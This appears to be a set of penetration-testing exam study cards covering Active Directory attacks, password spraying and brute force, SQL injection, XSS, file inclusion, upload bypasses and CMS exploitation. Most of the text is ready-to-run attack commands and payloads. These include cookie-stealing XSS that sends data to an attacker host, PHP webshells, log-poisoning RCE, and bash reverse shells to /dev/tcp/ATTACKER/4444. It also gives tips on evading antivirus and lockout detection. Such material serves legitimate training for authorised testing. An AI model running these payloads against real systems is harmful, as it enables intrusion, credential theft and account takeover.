cheatsheet_md:
BloodHound Collection

SharpHound.exe -c All --zipfilename bh.zip
impacket-bloodhound -u user -p pass -d corp.local -dc DC01.corp.local -c All

PowerView Key Queries

Get-DomainUser -SPN                # Kerberoastable users
Get-DomainUser -PreauthNotRequired # AS-REP Roastable
Get-DomainComputer -Unconstrained  # Unconstrained delegation
Get-DomainGroupMember 'Domain Admins'
Find-LocalAdminAccess              # Hosts where current user is local admin
Get-DomainPolicy | select -ExpandProperty SystemAccess  # Password policy

LDAP Enumeration

ldapsearch -x -H ldap://DC_IP -b 'DC=corp,DC=local' -D 'user@corp.local' -w 'pass' '(objectClass=user)'
nxc ldap DC_IP -u user -p pass --users
nxc ldap DC_IP -u user -p pass --groups
pitfalls_md:
• Running SharpHound from disk — AV detects SharpHound.exe by name. Rename to something benign or run the C# in-memory version.
  • Not checking password policy before spraying — Get-DomainPolicy first. Default lockout is 5 attempts. Spraying above threshold = mass account lockout.
  • Ignoring nested group membership — A user in GroupA where GroupA is in Domain Admins. BloodHound shows this; Get-DomainGroupMember -Recurse does too.
  • Missing service account SPNs — Service accounts are often over-privileged with weak passwords. Get-DomainUser -SPN reveals all Kerberoastable accounts.
exam_tips_md:
• BloodHound is the map — run it first with all collection methods before anything else. Mark every compromised account as owned to unlock path queries.
  • Find-LocalAdminAccess is a low-noise pivot finder — run from every compromised user account.
  • AS-REP Roasting doesn't require a password: impacket-GetNPUsers corp.local/ -usersfile users.txt -dc-ip DC_IP -no-pass.
  • Always check for AS-REP + Kerberoasting before bruteforce — no lockout risk and gives hashes to crack offline.

cheatsheet_md:
Kerberoasting

impacket-GetUserSPNs corp.local/user:pass -dc-ip DC_IP -request -output hashes.txt
hashcat -m 13100 hashes.txt /usr/share/wordlists/rockyou.txt

AS-REP Roasting

impacket-GetNPUsers corp.local/ -usersfile users.txt -dc-ip DC_IP -no-pass -format hashcat
hashcat -m 18200 asrep.txt /usr/share/wordlists/rockyou.txt

Password Spraying AD

nxc smb DC_IP -u users.txt -p 'Password1' --continue-on-success
nxc smb DC_IP -u users.txt -p 'SeasonYear!' --continue-on-success

ACL Abuse

# GenericWrite on User -> Targeted Kerberoasting:
Set-DomainObject -Identity target -Set @{serviceprincipalname='fake/spn'}
impacket-GetUserSPNs -request -dc-ip DC_IP corp.local/owned:pass
pitfalls_md:
• Cracking Kerberoast hashes without rules — Add -r /usr/share/hashcat/rules/best64.rule. Service accounts often use Base+Complexity patterns.
  • Missing targeted Kerberoasting — GenericWrite on a user = set SPN = Kerberoast that user. BloodHound shows GenericWrite edges.
  • Not using --continue-on-success in spraying — Without it, nxc stops at first success. Miss additional valid accounts.
  • Spraying too fast — Add delay between attempts: nxc --jitter 1 to avoid lockout and detection patterns.
exam_tips_md:
• Kerberoast all SPNs immediately after gaining valid credentials — high-privilege service accounts crack to plaintext on common wordlists.
  • BloodHound GenericAll / GenericWrite edges on users = immediate escalation path via targeted Kerberoasting or forced password change.
  • ACL abuse chain: GenericWrite -> Kerberoast -> crack hash -> use plain password for full account access.
  • Password spray pattern: Season+Year (Winter2024!), Company+Year!, Company+123 — most common corporate password patterns.

cheatsheet_md:
Burp Suite Essentials

# Scope: Target -> Scope -> Add domain
# Intercept: Proxy -> Intercept On
# Active scan: right-click request -> Scan
# Intruder positions: highlight param -> Add
# Repeater shortcut: Ctrl+R

Key Headers to Modify

X-Forwarded-For: 127.0.0.1
X-Real-IP: 127.0.0.1
Referer: https://admin.target.com
Origin: https://trusted.com
Content-Type: application/json

Match & Replace (WAF Bypass)

Proxy -> Options -> Match and Replace
Add: User-Agent -> Googlebot/2.1
pitfalls_md:
• Not setting scope before scanning — Without scope limits, active scan hits every URL in history including third-party sites. Can cause issues in real engagements.
  • Missing HTTPS traffic — Install Burp CA in your browser. Without it, HTTPS sites show connection errors.
  • Not using Repeater for manual testing — Ctrl+R sends any request to Repeater. Essential for iterating on injections without re-browsing.
  • Forgetting Burp Collaborator for OOB — SSRF, XXE, blind SQLi, Log4Shell all require OOB callbacks. Burp Collaborator provides the DNS/HTTP server.
exam_tips_md:
• Always set scope first to avoid noise. Add target domain with wildcard: .*\.target\.com$
  • Burp Intruder Cluster Bomb for credential attacks: Position 1 = username list, Position 2 = password list.
  • Comparer (Ctrl+W) finds differences between responses — invaluable for blind SQLi and IDOR confirmation.
  • Turbo Intruder extension for rate-bypass testing — can send thousands of requests per second, bypassing per-request rate limits.

cheatsheet_md:
Directory/File Fuzzing

ffuf -w /usr/share/seclists/Discovery/Web-Content/raft-medium-directories.txt -u http://target.com/FUZZ -mc 200,301,302,403
ffuf -w /usr/share/seclists/Discovery/Web-Content/raft-medium-files.txt -u http://target.com/FUZZ

DNS Subdomain Enum

ffuf -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-5000.txt -u http://FUZZ.target.com -H 'Host: FUZZ.target.com' -mc 200,302

Parameter Fuzzing

ffuf -w /usr/share/seclists/Discovery/Web-Content/burp-parameter-names.txt -u 'http://target.com/page?FUZZ=test' -mc 200,302

POST Data Fuzzing

ffuf -w wordlist.txt -u http://target.com/login -X POST -d 'username=FUZZ&password=test' -H 'Content-Type: application/x-www-form-urlencoded' -mc 302
pitfalls_md:
• Not filtering by size — Use -fs SIZE to hide the default 'not found' page size. Find it by running ffuf and noting the consistent response size for 404s.
  • Missing -recursion — By default ffuf doesn't recurse into found directories. Add -recursion -recursion-depth 2 for deeper enumeration.
  • Flooding server with concurrent requests — Default 40 threads can cause errors or rate limiting. Use -t 20 or lower for stability.
  • Forgetting extension fuzzing — Add -e .php,.bak,.txt,.html to catch backup files and scripts alongside directories.
exam_tips_md:
• Start with raft-medium-directories, then switch to big or raft-large for thorough enumeration on important targets.
  • VHost fuzzing: always add wordlist against Host header for virtual hosts — many targets serve different content on subdomains vs IP.
  • Combine directory + extension: -w dirs.txt -e .php,.bak,.config catches config backups (database.php.bak is a common critical find).
  • -o results.json -of json saves all findings for documentation — include raw ffuf output in appendix.

cheatsheet_md:
Hydra HTTP POST

hydra -L users.txt -P /usr/share/wordlists/rockyou.txt target.com http-post-form '/login:username=^USER^&password=^PASS^:Invalid credentials' -t 30

Hydra SSH/FTP

hydra -l admin -P /usr/share/wordlists/rockyou.txt ssh://target.com
hydra -L users.txt -P passwords.txt ftp://target.com

Medusa

medusa -h target.com -U users.txt -P passwords.txt -M ssh -t 5

Custom Wordlists

cewl http://target.com -d 3 -m 5 -w custom.txt
rules: $1 $! $@ Az'[A-Z]' c (hashcat rules)
pitfalls_md:
• Not identifying the fail string correctly — Hydra needs the exact failure message (Invalid credentials). Misidentifying causes false positives or misses successes.
  • Not using CeWL for custom wordlists — Company-specific terminology (product names, slogans) is often used in passwords and not in standard wordlists.
  • Bruteforcing without checking for lockout policy — Always check or infer lockout behavior. Most corporate apps lock after 3–5 failures.
  • Missing default credentials check — Always try admin:admin, admin:password, admin:[blank] before bruteforcing. Many internal tools use defaults.
exam_tips_md:
• Default credential list: admin:admin, admin:password, root:root, user:user, admin:1234. Try manually before automated bruteforce.
  • CeWL + hashcat rules = targeted wordlist. Run: cewl target.com -d 2 -m 6 | hashcat --stdout -r /usr/share/hashcat/rules/best64.rule > targeted.txt
  • Username enumeration: if 'User not found' vs 'Wrong password' — enumerate users first with just username field.
  • Document: tool used, target endpoint, wordlist, duration, result (credentials found). Include successful login screenshot.

cheatsheet_md:
Detection

' -- classic
' OR 1=1 --
' OR 'a'='a
1; SELECT SLEEP(5)--  (MySQL time-based)
1'; WAITFOR DELAY '0:0:5'-- (MSSQL)

UNION SELECT Enumeration

# Column count:
' ORDER BY 1--
' ORDER BY 2--
# Union with correct columns:
' UNION SELECT NULL,NULL,NULL--
# Extract data:
' UNION SELECT 1,table_name,3 FROM information_schema.tables--
' UNION SELECT 1,column_name,3 FROM information_schema.columns WHERE table_name='users'--
' UNION SELECT 1,username,password FROM users--

MySQL Specific

' UNION SELECT 1,@@version,3--
' UNION SELECT 1,user(),3--
' UNION SELECT 1,load_file('/etc/passwd'),3--
pitfalls_md:
• Not URL-encoding payloads in GET requests — Spaces become %20 or +, single quotes %27. Use Burp Repeater to handle encoding automatically.
  • Guessing column count instead of incrementing ORDER BY — Always increment ORDER BY 1, 2, 3... until error to confirm exact column count before UNION.
  • Assuming all databases are MySQL — MSSQL uses TOP/WAITFOR, Oracle needs FROM dual, PostgreSQL has pg_sleep. Fingerprint first.
  • Missing second-order SQLi — Payloads stored in DB and executed later. Test update endpoints and profile fields that are later queried.
exam_tips_md:
• Always start manual: inject ' into every parameter. Error message reveals DB type and confirms injection point before using sqlmap.
  • Time-based blind: SLEEP(5) for MySQL, WAITFOR DELAY '0:0:5' for MSSQL, pg_sleep(5) for PostgreSQL. Reliable when no visible output.
  • Out-of-file: MySQL load_file('/etc/passwd') and INTO OUTFILE '/var/www/html/shell.php' — SUPER/FILE privilege required.
  • Document: injection point (exact parameter), type (UNION/blind/time), DB type, tables extracted, escalation achieved (RCE via INTO OUTFILE).

cheatsheet_md:
Basic Usage

sqlmap -u 'http://target.com/page?id=1' --batch
sqlmap -u 'http://target.com/page?id=1' --dbs
sqlmap -u 'http://target.com/page?id=1' -D dbname --tables
sqlmap -u 'http://target.com/page?id=1' -D dbname -T users --columns
sqlmap -u 'http://target.com/page?id=1' -D dbname -T users -C username,password --dump

POST Request

sqlmap -u 'http://target.com/login' --data='user=test&pass=test' -p user --batch

Burp Request File

sqlmap -r request.txt --batch --level=5 --risk=3

OS Interaction

sqlmap -r req.txt --os-shell  # Interactive OS shell (MySQL/MSSQL)
sqlmap -r req.txt --file-read=/etc/passwd
pitfalls_md:
• Running sqlmap without --batch in automated contexts — Use --batch for non-interactive runs. Otherwise it prompts and hangs.
  • Not using -r for complex requests — For requests with cookies, custom headers, or POSTbodieswith special characters, save from Burp and use -r request.txt.
  • Forgetting --level and --risk for thorough testing — Default level=1, risk=1 misses many injection points. Use --level=5 --risk=3 for complete coverage (slower).
  • Overlooking --os-shell capability — When FILE privilege is available, sqlmap can read files and write webshells for OS command execution.
exam_tips_md:
• Save the Burp request (right-click -> Save to file) and use sqlmap -r request.txt for reliable complex request handling.
  • --dump-all --exclude-sysdbs dumps every non-system database — good for comprehensive credential extraction after confirming injection.
  • --os-shell on MySQL with FILE privilege gives interactive command execution. Confirm: SHOW GRANTS shows FILE in privileges list.
  • Cookie injection: sqlmap -u 'http://target.com/' --cookie='session=*' --level=2 (asterisk marks injection parameter).

cheatsheet_md:
Basic Detection

<script>alert(1)</script>
<img src=x onerror=alert(1)>
<svg onload=alert(1)>
"><script>alert(1)</script>
'><img src=x onerror=alert(1)>

Cookie Theft

<script>document.location='http://ATTACKER/?c='+document.cookie</script>
<img src=x onerror="fetch('http://ATTACKER/?c='+document.cookie)">

Filter Bypass

<ScRiPt>alert(1)</sCrIpT>  (case)
<script>al\u0065rt(1)</script>  (unicode)
<svg/onload=alert(1)>  (no space)
javascript:alert(1)  (href attr)

DOM XSS

# Look for: innerHTML, document.write, eval, location.hash
# Payload in URL: http://target.com/#<img src=x onerror=alert(1)>
pitfalls_md:
• Using alert() in reports — alert() is only for proof of concept. Always demonstrate real impact: cookie theft, session hijacking, keylogging for the report.
  • Missing stored XSS in less obvious fields — Username, profile bio, address fields that display to admins are often vulnerable stored XSS points. Admin-targeted stored XSS = account takeover.
  • Not testing DOM XSS separately — DOM XSS doesn't go through the server so server-side scanning misses it. Manually review JavaScript source for dangerous sinks.
  • Ignoring CSP — Check Content-Security-Policy header. Strict CSP blocks inline scripts. Look for CSP bypass opportunities (nonces, unsafe-inline, data:).
exam_tips_md:
• Impact chain: stored XSS in admin panel -> steal admin session cookie -> account takeover. Document with cookie value in request and successful admin login using it.
  • CSP bypass: if unsafe-inline is allowed, basic payloads work. If strict-dynamic, find an allowed script source to inject into.
  • For the exam report: show the payload injected, the triggering context (e.g., admin views user list), the stolen cookie, and the resulting authenticated session.
  • BeEF framework hooks browsers for comprehensive XSS impact demonstration — shows what real attackers could do beyond alert().

cheatsheet_md:
LFI Detection

?page=../../../etc/passwd
?page=....//....//....//etc/passwd
?page=%2e%2e%2f%2e%2e%2f%2e%2e%2fetc%2fpasswd  (URL encoded)
?page=php://filter/read=convert.base64-encode/resource=index.php

Log Poisoning -> RCE

# Inject PHP into User-Agent:
curl -A '<?php system($_GET["cmd"]); ?>' http://target.com/
# Include log file:
?page=/var/log/apache2/access.log&cmd=id

RFI

?page=http://10.10.14.5/shell.php
?page=\\10.10.14.5\share\shell.php  (Windows UNC)

PHP Wrappers

php://filter/convert.base64-encode/resource=config
php://input  (POST body as PHP)
data://text/plain;base64,BASE64_PHP_CODE
pitfalls_md:
• Not checking PHP wrappers — php://filter leaks PHP source in base64. Reveals DB credentials in config files even without RCE.
  • Forgetting Windows path separators — On Windows targets, use ..\..\..\windows\system32\drivers\etc\hosts or URL-encode backslashes.
  • Not trying null byte (%00) — In old PHP versions (< 5.3.4), null byte truncates extensions appended by the application: ?page=../etc/passwd%00
  • Log poisoning requires write+read — You need to inject into a log file the app reads. Apache, Nginx logs, PHP session files, SSH auth.log are common targets.
exam_tips_md:
• php://filter/read=convert.base64-encode/resource=config is always the first wrapper to try — leaks source code with credentials.
  • Log poisoning path: User-Agent injection -> include /var/log/apache2/access.log -> RCE. Verify log path with /proc/self/fd/2 or /var/log/nginx/access.log.
  • For RFI: ensure allow_url_include=On (verify with phpinfo() if accessible). Less common in modern PHP configurations.
  • Document: traversal payload, file read proof (first 5 lines of /etc/passwd), RCE escalation (whoami/id output), full exploitation chain.

cheatsheet_md:
Extension Bypass

shell.php5
shell.php.jpg
shell.pHp
shell.PhP
shell.php%00.jpg  (null byte, old PHP)
shell.phtml
shell.phar

Content-Type Bypass

# Change in Burp: Content-Type: image/jpeg (while keeping PHP payload)

Webshell Payloads

<?php system($_GET['cmd']); ?>
<?php echo shell_exec($_REQUEST['c']); ?>
# Minimal:
<?=system($_GET[0])?>

Magic Bytes

# Prepend GIF header:
GIF89a;<?php system($_GET['cmd']); ?>
# Rename: shell.gif.php or shell.php if GIF check is content-only
pitfalls_md:
• Not trying double extensions — shell.jpg.php — some servers serve based on last extension. Also try shell.php.jpg where PHP might still parse it based on MIME type.
  • Forgetting .htaccess upload — If you can upload .htaccess, add: AddType application/x-httpd-php .jpg — then upload shell.jpg and it executes as PHP.
  • Not finding the upload path — Webshell is useless if you can't access it. Enumerate /uploads/, /files/, /media/, /images/ — or check the response for the URL.
  • Missing SVG/XML upload vectors — SVG files can contain JavaScript (XSS) or XXE payloads. Always test SVG upload if PDF/image uploads are allowed.
exam_tips_md:
• .htaccess upload is the most reliable bypass: AddType application/x-httpd-php .jpg6 — then upload shell.jpg6. Works even when PHP extensions are blocked.
  • Always verify the upload path by checking the response JSON, page HTML, or source for the uploaded file's URL.
  • For the exam: demonstrate RCE from webshell (whoami, id, cat /etc/passwd) and upgrade to full reverse shell via: php -r 'exec("bash -c 'bash -i >& /dev/tcp/ATTACKER/4444 0>&1'");'
  • Document: bypass technique, request showing bypass in Burp, webshell URL, command execution output.

cheatsheet_md:
Detection Payloads

; id
| id
&& id
`id`
$(id)
; ping -c 1 10.10.14.5
| ping -c 1 10.10.14.5
%0a id  (URL-encoded newline)

Blind Command Injection

# OOB DNS (use Burp Collaborator / interactsh):
; nslookup $(whoami).COLLAB_DOMAIN
; curl http://ATTACKER/$(whoami)
# Time-based:
; sleep 5

Filter Bypass

# No spaces:
{id}   -> IFS variable: ${IFS}id
$IFS   used as space: cat${IFS}/etc/passwd
# Backtick: `id`
# Env vars: $PATH | $HOME | cat /etc$HOME/../etc/passwd
pitfalls_md:
• Testing only ; separator — Try all separators: ;, |, &, &&, ||, newline (%0a), backtick. Different OS/shell combinations respond to different separators.
  • Missing blind injection — No visible output doesn't mean no injection. Always test OOB (pingback/DNS) and time-based (sleep 5) for blind confirmation.
  • Not URL-encoding in GET parameters — & in URLs is a parameter separator. Use %26 for literal ampersand in GET. Check encoding in Burp.
  • Forgetting Windows command separators — Windows: & cmd /c [command], | [command], && [command] (chain on success). ping -n 1 ATTACKER for callback (not ping -c).
exam_tips_md:
• OOB callback is the most reliable blind detection — set up nc -nlvp 80 or use Burp Collaborator. DNS-based: ; nslookup $(whoami).COLLABORATOR.
  • Upgrade from webshell/injection to full reverse shell: bash -c 'bash -i >& /dev/tcp/ATTACKER/4444 0>&1' (URL-encode in GET parameters).
  • Document: payload used, separator type, OOB callback evidence (IP+timestamp+command output in DNS query), full RCE chain.
  • Check for filter evasion needed: if semicolons filtered try newline %0a; if spaces filtered use ${IFS} or {command}.

cheatsheet_md:
IDOR Testing

GET /api/user/1  -> change to /api/user/2, /api/user/3
GET /download?file=invoice_001.pdf -> try invoice_002.pdf
POST /api/order/canc {"order_id":"123"} -> use another user's order ID

XXE

<?xml version="1.0"?>
<!DOCTYPE root [<!ENTITY xxe SYSTEM "file:///etc/passwd">]>
<root><user>&xxe;</user></root>

CSRF PoC

<form action="http://target.com/transfer" method="POST">
  <input type="hidden" name="amount" value="1000">
  <input type="hidden" name="to" value="attacker">
</form>
<script>document.forms[0].submit()</script>

SSRF

url=http://169.254.169.254/latest/meta-data/
url=http://127.0.0.1:8080/admin
url=gopher://127.0.0.1:6379/_PING
pitfalls_md:
• Missing indirect IDOR — IDOR via predictable filenames or reference numbers (invoice_001.pdf) — not just numeric IDs. Also test GUIDs — sometimes sequential or guessable.
  • Not testing XXE in file uploads — SVG, DOCX, XLSX, and PPTX files contain XML. Upload malicious versions to test XXE in parsers processing these formats.
  • Checking only GET for CSRF — POST-based CSRF is common. Also check PUT/DELETE — some frameworks don't validate CSRF tokens for these methods.
  • Not converting JSON to XML for XXE — If the app accepts both JSON and XML (Content-Type: text/xml), switch to XML and inject XXE payload.
exam_tips_md:
• IDOR + privilege escalation: access another user's data (horizontal) then try accessing admin-level resources (vertical IDOR).
  • XXE to SSRF: use XXE external entity to fetch internal URLs: <!ENTITY xxe SYSTEM "http://169.254.169.254/latest/meta-data/">
  • CSRF impact is highest on state-changing actions: password change, email change, fund transfer, admin actions. Demonstrate with a working PoC HTML page.
  • For all findings: show request, response, impact, and remediation. IDOR shows unauthorized data. CSRF shows unauthorized action.

cheatsheet_md:
WordPress

wpscan --url http://target.com -e u,p,t --api-token TOKEN
# Admin RCE: Appearance -> Theme Editor -> 404.php -> PHP shell
wpscan --url http://target.com -U admin -P rockyou.txt --password-attack xmlrpc

Joomla

joomscan --url http://target.com
# Admin panel: /administrator
# RCE: Extensions -> Templates -> Edit -> inject PHP

Jenkins

# RCE if admin: Manage Jenkins -> Script Console
Thread.start { 'id'.execute().text }.join()
# Groovy reverse shell:
'bash -c {echo,BASE64_CMD}|{base64,-d}|bash'.execute()

GitLab/GitHub

# Search for secrets in repos:
git log --all --oneline
git show COMMIT:path/to/file
# API: GET /api/v4/projects?private_token=TOKEN
pitfalls_md:
• Not checking default credentials on every CMS/service — admin:admin, admin:password, admin:[appname], jenkins:jenkins, tomcat:tomcat. Common apps are frequently deployed with defaults.
  • Skipping xmlrpc.php on WordPress — Even if admin login page blocks bruteforce, xmlrpc.php often has no rate limiting. wpscan --password-attack xmlrpc exploits this.
  • Missing Jenkins unauthenticated access — Older Jenkins versions allow anonymous access to Script Console. Always check /script directly.
  • Not checking exposed .git directory — /.git/ accessible on web server = full source code extraction with git-dumper. Often contains credentials in config files.
exam_tips_md:
• WordPress chain: wpscan enumerate -> find admin -> Theme Editor PHP injection -> webshell -> reverse shell. Reliable, well-documented attack path.
  • Jenkins Script Console (Groovy) gives OS execution as the jenkins service user. Upgrade to full reverse shell with bash one-liner.
  • Tomcat manager (with credentials): upload malicious .war file with msfvenom WAR payload -> deploy -> browse to trigger reverse shell.
  • For exposed .git: git-dumper http://target.com/.git/ ./extracted; then grep -r password ./extracted/ to find credentials.
